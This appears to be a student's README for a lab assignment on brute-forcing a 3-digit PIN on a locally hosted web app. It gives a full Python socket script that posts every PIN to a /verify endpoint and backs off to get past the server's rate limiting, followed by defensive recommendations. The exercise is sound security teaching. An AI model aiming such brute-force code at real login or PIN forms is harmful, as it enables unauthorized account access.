PIN Cracker - IT6 Take Home Drill

This repository contains my solution for the IT6 Take Home Drill assignment, which involves creating a Python script to crack a 3-digit PIN on a locally hosted web application using only the standard socket library.

Project Overview

The challenge involves:
- Analyzing a web application that requires a 3-digit numeric PIN
- Creating a Python script that can systematically try all possible PIN combinations
- Using only the standard socket library (no requests, urllib, etc.)
- Handling server constraints that slow down brute force attempts
- Detecting when the correct PIN is found

Technical Approach

1. Discovering the Server

To find the server's address and port, I used:
- Wireshark to capture network traffic when starting the executable
- Browser developer tools to analyze network requests
- Basic network scanning tools (netstat)

I discovered the server was running on 127.0.0.1 (localhost) on port 8888.

2. Understanding the HTTP Protocol Implementation

By examining the web application in a browser and using developer tools, I:
- Identified the form submission method (POST)
- Determined the endpoint (/verify)
- Found the parameter name for the PIN (magicNumber)
- Analyzed the HTTP request headers and body format

3. Solution Strategy

My approach to brute forcing the PIN involved:

1. Creating a Script: Developed a Python script using only the socket library
2. Crafting HTTP Requests: Manually constructed valid HTTP POST requests
3. Systematic Testing: Implemented a loop to try all possible PINs from 000-999
4. Response Analysis: Parsed responses to detect success or failure
5. Constraint Handling: Added delays between requests to work around server anti-brute force mechanisms

4. Challenges and Solutions

1. Rate Limiting: The server implemented a "slow down" mechanism
   - Solution: Added dynamic sleep timers that increased when warned by the server

2. HTTP Protocol Compliance: Ensuring proper request formatting
   - Solution: Carefully crafted headers and body with proper content length and encoding

3. Response Parsing: Identifying successful attempts from HTTP responses
   - Solution: Added string pattern matching to look for "Congratulations" or "Correct" in responses

The Solution

The final solution is a Python script that:
- Creates a socket connection to the server
- Forms and sends properly formatted HTTP POST requests
- Tests all possible 3-digit PIN combinations (000-999)
- Handles server rate limiting by implementing appropriate delays
- Detects success when the correct PIN is found

```python
import socket
import time

Address = '127.0.0.1'
Port = 8888

sleep_time = 1.0 

for pin in range(0, 1000):
    formatted_pin = f"{pin:03d}"

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((Address, Port))

        body = f"magicNumber={formatted_pin}"
        request = (
            f"POST /verify HTTP/1.1\r\n"
            f"Host: {Address}:{Port}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )

        client_socket.sendall(request.encode())
        response = b""
        while True:
            part = client_socket.recv(4096)
            if not part:
                break
            response += part

        decoded_response = response.decode(errors="ignore")

        if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
            print(f"[+] Found correct PIN: {formatted_pin}")
            print(decoded_response) 
            break
        elif "slow down" in decoded_response.lower():
            print(f"[!] Server said slow down after PIN {formatted_pin}. Increasing sleep time...")
            sleep_time += 0.5
        else:
            print(f"[-] Tried PIN: {formatted_pin}")

    except Exception as e:
        print(f"[!] Error with PIN {formatted_pin}: {e}")

    finally:
        client_socket.close()

    time.sleep(sleep_time)

print("Brute force completed")

```

What I Learned

Through this assignment, I gained practical experience with:
- Low-level network programming using the socket library
- HTTP protocol details and crafting requests manually
- Brute force attack methodology and constraints
- Defensive countermeasures against brute force attacks
- Network traffic analysis using tools like Wireshark

Security Recommendations

To protect against this type of attack, I would recommend implementing:

1. Account Lockout: Temporarily lock accounts after a certain number of failed attempts
2. Progressive Delays: Increase waiting time between attempts exponentially
6. Stronger Credentials: Increase PIN length or use alphanumeric passwords
7. Request Monitoring: Implement systems to detect and alert on suspicious activity

Video Tutorial

A video walkthrough explaining my approach and answering all required questions can be found [here](VIDEO_LINK).

Running the Code

To run this code yourself:
1. Download and run the executable from the assignment
2. Ensure the server is running
3. Execute the Python script: `scripts.py`
4. The script will output the correct PIN when found

References

- [Socket Programming in Python](https://docs.python.org/3/library/socket.html)
- [HTTP Protocol](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [Web Security Best Practices](https://owasp.org/www-project-top-ten/)
